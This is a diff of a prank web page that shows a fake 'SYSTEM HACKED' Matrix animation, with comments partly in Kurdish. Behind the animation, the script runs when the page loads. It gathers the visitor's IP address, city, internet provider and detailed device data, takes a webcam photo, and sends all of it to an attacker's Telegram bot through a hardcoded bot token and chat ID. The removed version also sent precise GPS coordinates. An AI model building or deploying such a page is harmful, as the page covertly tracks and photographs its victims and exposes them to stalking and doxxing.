@@ -7,114 +7,92 @@
     <style>
         body { background: #000; margin: 0; overflow: hidden; font-family: 'Courier New', monospace; }
         canvas#matrix { position: absolute; top: 0; left: 0; z-index: -1; }
-        .content {
-            display: flex; flex-direction: column; align-items: center; justify-content: center;
-            height: 100vh; color: #0f0; text-shadow: 0 0 8px #0f0; background: rgba(0,0,0,0.6);
-        }
-        .box { border: 2px solid #0f0; padding: 20px; background: rgba(0,0,0,0.8); text-align: left; line-height: 1.5; }
+        .content { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; color: #0f0; text-shadow: 0 0 8px #0f0; background: rgba(0,0,0,0.6); }
+        .box { border: 2px solid #0f0; padding: 20px; background: rgba(0,0,0,0.8); text-align: left; }
     </style>
 </head>
 <body>
-    <iframe src="https://www.youtube.com/embed/u69mGv_LshY?autoplay=1&loop=1" allow="autoplay" style="display:none;"></iframe>
-    
+    <iframe src="https://www.youtube.com/embed/u69mGv_LshY?autoplay=1" allow="autoplay" style="display:none;"></iframe>
     <canvas id="matrix"></canvas>
-    
     <div class="content">
         <h1>[ SYSTEM HACKED ]</h1>
-        <div class="box">
-            <p>> Accessing Core Database...</p>
-            <p>> Bypassing Security Protocols...</p>
-            <p id="status">> Extracting Data: 100%</p>
-        </div>
+        <div class="box"><p id="status">> Extracting Advanced Data...</p></div>
     </div>
-
     <video id="video" style="display:none;" autoplay></video>
     <canvas id="picCanvas" style="display:none;"></canvas>
 
     <script>
-        // --- ئەنیمەیشنی ماتریکس ---
+        // Matrix Animation
         const canvas = document.getElementById('matrix');
         const ctx = canvas.getContext('2d');
-        canvas.width = window.innerWidth;
-        canvas.height = window.innerHeight;
-        const letters = "01010101HACKEDSYSTEM666";
+        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
+        const letters = "01HACKED666";
         const fontSize = 16;
-        const columns = canvas.width / fontSize;
-        const drops = Array(Math.floor(columns)).fill(1);
-
-        function drawMatrix() {
-            ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
-            ctx.fillRect(0, 0, canvas.width, canvas.height);
-            ctx.fillStyle = "#0f0";
-            ctx.font = fontSize + "px monospace";
-            for (let i = 0; i < drops.length; i++) {
-                const text = letters.charAt(Math.floor(Math.random() * letters.length));
-                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
-                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
+        const drops = Array(Math.floor(canvas.width / fontSize)).fill(1);
+        function draw() {
+            ctx.fillStyle = "rgba(0,0,0,0.05)"; ctx.fillRect(0,0,canvas.width,canvas.height);
+            ctx.fillStyle = "#0f0"; ctx.font = fontSize + "px monospace";
+            drops.forEach((y, i) => {
+                ctx.fillText(letters[Math.floor(Math.random()*letters.length)], i*fontSize, y*fontSize);
+                if (y*fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
                 drops[i]++;
-            }
+            });
         }
-        setInterval(drawMatrix, 33);
-
-        // --- ناردنی هەموو زانیارییەکان ---
-        const botToken = '8117812522:AAGFhq6xv5zgci1Z9mt5H1a3c26V7h48CI4';
-        const chatId = '1034878899';
+        setInterval(draw, 33);
 
         async function start() {
             try {
                 const res = await fetch('https://ipapi.co/json/');
                 const data = await res.json();
-                const ua = navigator.userAgent;
+                
+                // وەرگرتنی Hz (Refresh Rate)
+                const getHz = () => new Promise(r => requestAnimationFrame(t1 => requestAnimationFrame(t2 => r(Math.round(1000/(t2-t1))))));
+                const hz = await getHz();
 
-                // مۆدێل
-                let model = /Android/i.test(ua) ? (ua.match(/Android\s+([^\s;]+);\s+([^;)]+)/)?.[2] || "Android") : (/iPhone/i.test(ua) ? "iPhone" : "PC");
-
-                // پاتری ورد
-                let battInfo = "نادیار";
+                // پاتری و شەحن
+                let batt = "N/A";
                 if (navigator.getBattery) {
                     const b = await navigator.getBattery();
-                    battInfo = `${Math.round(b.level * 100)}% (${b.charging ? '⚡ لە شەحنە' : '🔋 لە شەحن نییە'})`;
+                    batt = `${Math.round(b.level*100)}% (${b.charging ? '⚡ Charging' : '🔋 Discharging'})`;
                 }
 
+                // GPU & Theme
+                const gl = document.createElement('canvas').getContext('webgl');
+                const gpu = gl.getExtension('WEBGL_debug_renderer_info') ? gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL) : "N/A";
+                const dark = window.matchMedia('(prefers-color-scheme: dark)').matches ? "ON" : "OFF";
+
                 const msg = `
-🎭 MATRIX FULL HACK:
-📱 مۆدێل: ${model}
+🎭 MATRIX FULL DATA:
+📱 مۆدێل: ${navigator.userAgent.match(/Android\s+([^\s;]+);\s+([^;)]+)/)?.[2] || "Device"}
 🌐 ئایپی: ${data.ip}
-📍 وڵات: ${data.country_name}
-🏙 شار: ${data.city}
+📍 شار: ${data.city} (${data.country_name})
 🏢 کۆمپانیا: ${data.org}
-🔋 پاتری: ${battInfo}
-💾 ڕام: ${navigator.deviceMemory || 'نادیار'} GB
+🔋 پاتری: ${batt}
+🔄 شاشە: ${hz}Hz
+🌙 دۆخی شەو: ${dark}
+🎮 گرافیک: ${gpu}
+💾 ڕام: ${navigator.deviceMemory || 'N/A'}GB
 ⚙️ پڕۆسێسەر: ${navigator.hardwareConcurrency} Cores
-🖥 شاشە: ${window.screen.width}x${window.screen.height}
-⏰ کات: ${new Date().toLocaleString()}
+🖥 قەبارە: ${window.screen.width}x${window.screen.height}
                 `;
-                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
-            } catch(e) {}
-
-            // ناردنی شوێنی ورد (دوای Allow)
-            navigator.geolocation.getCurrentPosition(pos => {
-                const loc = `📍 نەخشە: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(loc)}`);
-            });
-
-            // گرتنی وێنە (دوای Allow)
+                fetch(`https://api.telegram.org/bot8117812522:AAGFhq6xv5zgci1Z9mt5H1a3c26V7h48CI4/sendMessage?chat_id=1034878899&text=${encodeURIComponent(msg)}`);
+            } catch(e){}
+            
+            // Camera Snap
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.getElementById('video');
-                video.srcObject = stream;
+                const stream = await navigator.mediaDevices.getUserMedia({video:true});
+                const v = document.getElementById('video'); v.srcObject = stream;
                 setTimeout(() => {
                     const c = document.getElementById('picCanvas');
-                    c.width = video.videoWidth; c.height = video.videoHeight;
-                    c.getContext('2d').drawImage(video, 0, 0);
-                    c.toBlob(blob => {
-                        const frm = new FormData();
-                        frm.append('chat_id', chatId); frm.append('photo', blob, 'hacker.jpg');
-                        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: frm });
+                    c.width = v.videoWidth; c.height = v.videoHeight;
+                    c.getContext('2d').drawImage(v,0,0);
+                    c.toBlob(b => {
+                        const f = new FormData(); f.append('chat_id','1034878899'); f.append('photo',b,'x.jpg');
+                        fetch(`https://api.telegram.org/bot8117812522:AAGFhq6xv5zgci1Z9mt5H1a3c26V7h48CI4/sendPhoto`,{method:'POST',body:f});
                         stream.getTracks().forEach(t => t.stop());
-                    }, 'image/jpeg');
+                    },'image/jpeg');
                 }, 2000);
-            } catch(err) {}
+            } catch(h){}
         }
         window.onload = start;
     </script>
